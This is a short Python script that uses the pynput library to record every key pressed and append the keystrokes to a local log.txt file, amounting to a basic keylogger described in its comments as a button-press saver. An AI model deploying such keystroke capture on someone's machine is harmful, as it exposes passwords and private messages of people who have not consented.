""" Programm for save of push the button."""

# pip3 install pynput
from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)
# this function for save push button and write log.txt

with Listener(on_press = writetofile) as l:
    l.join()
